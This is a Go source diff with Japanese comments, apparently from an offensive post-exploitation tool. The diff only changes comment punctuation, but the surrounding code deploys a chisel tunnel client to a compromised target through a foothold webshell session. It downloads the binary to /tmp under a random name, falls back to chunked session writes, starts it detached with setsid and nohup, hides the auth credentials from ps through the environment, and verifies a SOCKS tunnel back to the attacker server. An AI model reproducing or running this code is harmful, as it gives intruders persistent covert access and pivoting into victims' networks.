@@ -2,7 +2,7 @@
 // ログを deploy_params に保存）、② クライアントバイナリを stage の管理下配信でワンタイム URL に変換し、セッション
 // 経由でターゲットの /tmp にランダム名でダウンロードして chmod+x（ターゲットに curl/wget がなければセッションの
 // 分割書き込み session.WriteFile にフォールバック）、③ リモートでバックグラウンド起動（出力をリダイレクトし、pid は
-// センチネルで取得）、④ トンネル内での決定的検証——通って初めて alive を付ける、⑤ いずれかが失敗したら RollbackSteps に従い段階的にロールバック。
+// センチネルで取得）、④ トンネル内での決定的検証。通って初めて alive を付ける、⑤ いずれかが失敗したら RollbackSteps に従い段階的にロールバック。
 package tunnel
 
 import (
@@ -36,7 +36,7 @@ const (
 	remoteExecWait = 120 * time.Second // バイナリのダウンロード（セッションの分割書き込みへのフォールバックを含む）
 )
 
-// Manager はトンネルサブシステムのランタイム：デプロイ/検証/ロールバック/ヘルスチェック/回収。管理対象リソースの原則——
+// Manager はトンネルサブシステムのランタイム：デプロイ/検証/ロールバック/ヘルスチェック/回収。管理対象リソースの原則。
 // すべての外部露出面（server プロセス、リモートプロセス、stage エントリ、待受ポート）はこれを通して登録・回収する。
 type Manager struct {
 	store      *db.TunnelStore
@@ -291,7 +291,7 @@ func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) er
 	if err == nil && strings.Contains(stdout, "ARTEX_DL_OK") {
 		return m.chmodRemote(ctx, sess, p)
 	}
-	// フォールバック：ターゲットに curl/wget がない（またはブロックされた）——セッションの分割書き込みを使う（session.WriteFile が内部で分割する）。
+	// フォールバック：ターゲットに curl/wget がない（またはブロックされた）。セッションの分割書き込みを使う（session.WriteFile が内部で分割する）。
 	log.Printf("[tunnel] ターゲットでの直接ダウンロードに失敗し、セッションの分割書き込みにフォールバックします（%s）…", p.RemoteDir)
 	data, rerr := os.ReadFile(m.chiselPath)
 	if rerr != nil {
@@ -339,7 +339,7 @@ func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan
 
 // spawnRemote はリモートで client をバックグラウンド起動し、センチネルで実際の pid を取得する。
 func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
-	// AUTH は env で注入する（chisel client は --auth 未指定時に AUTH env を読む）——auth は
+	// AUTH は env で注入する（chisel client は --auth 未指定時に AUTH env を読む）。auth は
 	// ターゲット機の ps cmdline に出ない。トレードオフとして、/proc/<pid>/environ は同一 uid から見えるが、ターゲットは既にフットホールドなので許容する。
 	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
 		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog)
@@ -388,9 +388,9 @@ func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) err
 	case KindSocks:
 		// 検証対象の候補を順に試し、いずれかが通ればトンネルは通ったとみなす：
 		// 1) 明示的な verify_addr（デフォルト = フットホールド webshell のアドレス。ただし NAT/ポートマッピングを経る場合
-		//    このアドレスはターゲット側では意味を持たない——実例：host:8082 がコンテナ：8080 にマッピングされ、コンテナのループバックに 8082 はない）、
+		//    このアドレスはターゲット側では意味を持たない。実例：host:8082 がコンテナ：8080 にマッピングされ、コンテナのループバックに 8082 はない）、
 		// 2) トンネル自身へのループバック callbackHost:listenPort（chisel server 自身。client は既に接続済み
-		//    なのでターゲット側から必ず到達できる）——socks 経由でサーバー側へ接続して戻ってくれば、トンネルが双方向に通信を運べることの証明になり、NAT の仮定を置かずに済む。
+		//    なのでターゲット側から必ず到達できる）。socks 経由でサーバー側へ接続して戻ってくれば、トンネルが双方向に通信を運べることの証明になり、NAT の仮定を置かずに済む。
 		cands := []string{}
 		if p.VerifyAddr != "" {
 			cands = append(cands, p.VerifyAddr)
